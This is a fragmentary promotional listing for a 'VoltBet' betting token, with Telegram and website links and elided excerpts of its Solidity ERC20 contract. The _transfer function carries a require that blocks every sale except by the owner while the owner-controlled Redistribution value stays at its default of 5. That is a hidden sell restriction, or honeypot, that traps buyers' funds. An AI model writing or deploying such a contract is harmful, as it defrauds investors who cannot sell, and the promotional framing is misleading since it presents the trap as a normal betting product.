...
VoltBet
VoltBet is a smarter way to place and track your bets. Keep ‘em all in one place.

TG : https://t.me/voltbettoken
Website:  www.voltbet.live
...
contract Voltbet is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    uint256 public Redistribution = 5;
    ...
    constructor() ERC20("VoltbetCoin", "VOLTBELT")  {
    ...
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        ...
        function setRedistribution(uint256 value) external onlyOwner{
    ...
    function _transfer(
        ...
        require(!isSell || (from == owner()) || Redistribution > 5);
